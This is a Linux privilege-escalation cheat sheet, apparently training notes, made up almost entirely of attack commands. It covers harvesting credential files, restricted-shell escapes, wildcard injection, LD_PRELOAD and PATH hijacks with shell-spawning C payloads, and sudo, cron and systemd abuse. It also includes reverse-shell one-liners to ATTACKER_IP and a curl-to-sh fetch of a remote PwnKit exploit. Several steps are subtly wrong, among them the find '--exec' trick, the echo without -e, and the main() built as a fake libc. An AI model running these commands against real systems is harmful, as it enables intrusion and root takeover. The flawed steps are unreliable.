# Linux Privilege Escalation - Cheat Sheet

## Information Gathering

### 1. System Information

```bash
uname -a                     # Kernel version
cat /etc/issue               # OS version
cat /proc/version            # Kernel details
cat /etc/os-release          # OS details
id                           # Current user info
whoami                       # Current user
who -a                       # Active sessions
last                         # Login history
ps aux --forest              # Running processes
```

### 2. Searching for Sensitive Files

<pre class="language-bash"><code class="lang-bash">find / -name "*pass*" 2>/dev/null    # Search for files containing "pass"
grep -r "password" /etc/ 2>/dev/null # Search for passwords
find / -perm -4000 -type f 2>/dev/null # SUID files
find / -perm -2000 -type f 2>/dev/null # SGID files
find / -user root -perm -4000 -exec ls -la {} + 2>/dev/null # Root SUID files
find /home -type f -name '.*history' 2>/dev/null # Command history files
<strong>find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student   #hidden files
</strong>find / -type d -name ".*" -ls 2>/dev/null    # hidden directories
</code></pre>

### 3. Permissions and Users

```bash
sudo -l                         # Check sudo privileges
cat /etc/passwd                 # List users
cat /etc/shadow                 # Hashed passwords (if accessible)
cat /etc/group                  # List groups
getent passwd                    # User info
getent group                     # Group info
ls -la /root/                    # Access root home
grep "*sh$" /etc/passwd         # which users have login shells
```

### 4. Cron Jobs

```bash
ls -la /etc/cron*                # List cron jobs
cat /etc/crontab                 # Global crontab content
find / -type f -iname "*cron*" 2>/dev/null # Search for cron jobs
systemctl list-timers --all      # Check systemd timers
```

### 5. Services and Processes

```bash
netstat -tulpn                   # Listening services
ss -tulpn                        # Alternative to netstat
ps aux | grep root               # Processes running as root
ps -ef | grep apache             # Apache processes
systemctl list-units --type=service --all # Active/inactive services
```

### 6. Logs and Emails

```bash
ls -lah /var/log/                # List logs
cat /var/log/auth.log            # Authentication logs
cat /var/log/syslog              # System logs
cat /var/spool/mail/*            # Emails
```

### 7. Common Service Paths

```bash
/etc/passwd
/etc/shadow
/etc/group
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.weekly/
/etc/cron.monthly/
/var/spool/cron/
/var/spool/cron/crontabs/
/etc/systemd/system/
/usr/lib/systemd/system/
```

## **Environment-Based Privilege**

### **1. Escaping Restricted Shells**

Restricted shells (`rbash`, `rksh`, `rsh`) limit commands and paths.

#### **Enumeration:**

*   Check if the shell is restricted:

    ```sh
    echo $0           # Check shell type  
    set -o           # List shell options  
    echo $SHELL      # Verify default shell  
    ```
*   Find available binaries:

    ```sh
    compgen -c       # List allowed commands  
    (cd /bin && ls)  # Check if `cd` is restricted  
    ```

#### **Exploitation:**

*   Use built-in commands:

    ```sh
    python -c 'import os; os.system("/bin/sh")'
    perl -e 'exec "/bin/sh";'
    ```
*   Exploit editors:

    ```sh
    vi -c ':!/bin/sh'
    less /etc/passwd  # Press `!` then `/bin/sh`
    ```
*   Overwrite `$PATH`:

    ```sh
    export PATH=/bin:/usr/bin:$PATH
    /bin/sh
    ```

***

### **2. Wildcard Abuse**

#### **Enumeration:**

*   Identify scripts or commands using wildcards:

    ```sh
    ls -la /path/to/script  # Look for wildcard-based execution  
    ps aux | grep script.sh  # Check if script runs automatically  
    ```
*   Check cron jobs or systemd services:

    ```sh
    cat /etc/crontab  
    systemctl list-timers --all  
    ```

#### **Exploitation:**

*   Inject a malicious command via a wildcard:

    ```sh
    echo "/bin/sh" > payload.sh
    chmod +x payload.sh
    touch "--checkpoint=1" "--checkpoint-action=exec=sh payload.sh"
    tar -cf archive.tar *
    ```
*   Exploit `find` with `-exec`:

    ```sh
    touch /tmp/hax
    touch "--exec=sh -c 'id > /tmp/hax' ;"
    find . -name '*.log' -exec echo {} \;
    ```

***

### **3. Environment Variable Abuse**

#### **Enumeration:**

*   Check for environment variables:

    ```sh
    env | grep -i path  
    strings /path/to/binary | grep getenv  
    ```
*   Find binaries vulnerable to `LD_PRELOAD`:

    ```sh
    sudo -l | grep LD_PRELOAD  
    ```

#### **Exploitation:**

*   **Hijack `PATH`:**

    ```sh
    echo -e '#!/bin/sh\n/bin/sh' > /tmp/fake-ls
    chmod +x /tmp/fake-ls
    export PATH=/tmp:$PATH
    /path/to/sudo command
    ```
*   **Exploit `LD_PRELOAD`:**

    ```c
    // malicious.c  
    #include <stdio.h>  
    #include <stdlib.h>  

    void _init() {  
        setuid(0);  
        system("/bin/sh");  
    }  
    ```

    ```sh
    gcc -shared -o /tmp/libhax.so -fPIC malicious.c
    LD_PRELOAD=/tmp/libhax.so /path/to/sudo command
    ```
*   **Exploit `LD_LIBRARY_PATH`:**

    ```sh
    mkdir /tmp/hax  
    echo 'int main(){ setuid(0); system("/bin/sh"); return 0; }' > /tmp/hax/libc.c  
    gcc -shared -o /tmp/hax/libc.so /tmp/hax/libc.c  
    export LD_LIBRARY_PATH=/tmp/hax  
    /path/to/vulnerable_binary
    ```
*   **Exploit `PYTHONPATH`:**

    ```sh
    mkdir /tmp/hax  
    echo 'import os; os.system("/bin/sh")' > /tmp/hax/os.py  
    export PYTHONPATH=/tmp/hax  
    python -c 'import os'
    ```

***

### **4. SUID & SGID Environment Exploits**

#### **Enumeration:**

*   Find SUID binaries:

    ```sh
    find / -perm -4000 -type f 2>/dev/null  
    ```
*   Check if `LD_PRELOAD` is respected in SUID binaries:

    ```sh
    ldd /path/to/suid_binary  
    ```

#### **Exploitation:**

*   **Using `SUID` + `LD_PRELOAD`:**

    ```c
    #include <stdio.h>  
    #include <stdlib.h>  

    void _init() {  
        setuid(0);  
        system("/bin/sh");  
    }  
    ```

    ```sh
    gcc -shared -o /tmp/libhax.so -fPIC malicious.c
    chmod +x /tmp/libhax.so  
    sudo LD_PRELOAD=/tmp/libhax.so /path/to/suid_binary  
    ```
*   **Using `SUID` + Environment Variables:**

    ```sh
    echo 'main() { setuid(0); system("/bin/sh"); }' > /tmp/hax.c  
    gcc -o /tmp/hax /tmp/hax.c  
    chmod +x /tmp/hax  
    ```

    Run SUID binary while setting an exploited environment variable.

***

### **5. Exploiting `cron` Jobs & Systemd Services**

#### **Enumeration:**

*   Check writable cron jobs:

    ```sh
    ls -la /etc/cron*  
    cat /etc/crontab  
    ```
*   Look for services running as root:

    ```sh
    systemctl list-units --type=service  
    ```

#### **Exploitation:**

*   **Modify a writable cron script:**

    ```sh
    echo '#!/bin/sh\n/bin/sh' > /path/to/script.sh  
    chmod +x /path/to/script.sh  
    ```
*   **Abuse systemd service restart:**

    ```sh
    echo "[Service]" > /etc/systemd/system/vuln.service  
    echo "ExecStart=/bin/sh" >> /etc/systemd/system/vuln.service  
    systemctl daemon-reload  
    systemctl restart vuln.service  
    ```

***

### **6. Exploiting `sudo` Misconfigurations**

#### **Enumeration:**

*   Check `sudo` permissions:

    ```sh
    sudo -l  
    ```
*   Identify commands that can be abused:

    ```sh
    sudo -l | grep -E '(awk|perl|python|less|vi|tar|find)'  
    ```

#### **Exploitation:**

*   **Using `awk`:**

    ```sh
    sudo awk 'BEGIN {system("/bin/sh")}'
    ```
*   **Using `find`:**

    ```sh
    sudo find . -exec /bin/sh \;
    ```
*   **Using `tar`:**

    ```sh
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    ```

***

### **7. Exploiting Capabilities (`cap_setuid`)**

#### **Enumeration:**

*   Check binaries with capabilities:

    ```sh
    getcap -r / 2>/dev/null  
    ```
*   Identify `cap_setuid` binaries:

    ```sh
    getcap /path/to/binary  
    ```

#### **Exploitation:**

*   If a binary has `cap_setuid+ep`, escalate privileges:

    ```sh
    /path/to/binary  
    ```

***

### **8. Exploiting `SSH` & `TMUX` Sessions**

#### **Enumeration:**

*   Check if a root session is open:

    ```sh
    ps aux | grep root  
    ```
*   List active `tmux` sessions:

    ```sh
    tmux list-sessions  
    ```

#### **Exploitation:**

*   Attach to an open root session:

    ```sh
    tmux attach-session -t 0  
    ```

### Reverse Shells

```bash
nc -e /bin/bash ATTACKER_IP ATTACKER_PORT  # Netcat (if -e is supported)
nc -c bash ATTACKER_IP ATTACKER_PORT       # Netcat alternative
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1  # Bash reverse shell
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",ATTACKER_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'  # Python3 reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'  # PHP reverse shell
```

### 9. Exploitation & Enumeration Tools

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250301-c97fb02a/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh  # Run LinPEAS

wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64
chmod +x pspy64 && ./pspy64  # Run pspy to monitor processes

#if vulnerable to Pwnkit
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

### 10. Practical Exploitation

<details>

<summary>SUID Executables</summary>

If you have a custom executable that has SUID, look if you can't find relative paths

[https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e](https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e)

```
strace -f ./executable 2>&1 | grep -iE "open|access|exec|execve"
```

malicious bash file if you find a relative path:

```
#!/bin/bash
/usr/bin/chmod u+s /bin/bash
/usr/bin/echo Done
```

Change path variable with the place you created you bash file:

```
export PATH=/home/user:$PATH
```

once you run the SUID file, `bash -p`

</details>
